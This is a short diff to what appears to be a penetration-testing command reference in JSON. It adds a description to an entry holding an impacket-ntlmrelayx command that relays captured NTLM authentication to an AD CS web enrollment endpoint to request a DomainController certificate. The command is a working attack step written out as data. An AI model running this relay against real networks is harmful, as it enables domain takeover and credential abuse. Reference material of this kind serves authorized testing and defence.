@@ -192,7 +192,8 @@
   "variations": [
     {
       "label": "Template DomainController",
-      "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+      "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "description": "Relays captured NTLM authentication to other services. Instead of cracking captured hashes, forwards the authentication to a target machine for immediate access - no password cracking needed."
     }
   ],
   "steps": [
